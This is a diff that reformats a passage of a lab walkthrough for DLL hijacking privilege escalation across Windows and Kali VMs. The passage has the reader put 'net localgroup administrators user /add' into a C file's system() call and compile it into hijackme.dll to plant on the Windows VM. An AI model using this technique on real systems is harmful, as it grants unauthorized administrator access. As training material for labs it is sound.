@@ -22,13 +22,20 @@ Exploitation<br/>
 <br/>
 Windows VM<br/>
 <br/>
-1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.<br/>
+1. Copy <b>‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’</b>&nbsp;to the Kali VM.<br/>
 <br/>
 Kali VM<br/>
 <br/>
-1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add<br/>
-2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll<br/>
+1. Open windows_dll.c in a text editor and replace the command used by the system() function to:<br/>
+<b>cmd.exe /k net localgroup administrators user /add<br/>
+</b><br/>
+2. Exit the text editor and compile the file by typing the following in the command prompt:<br/>
+<b>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll<br/>
+</b><br/>
 3. Copy the generated file hijackme.dll, to the Windows VM.<br/>
+<br/>
+<br/>
+<br/>
 <br/>
 Windows VM<br/>
 <br/>
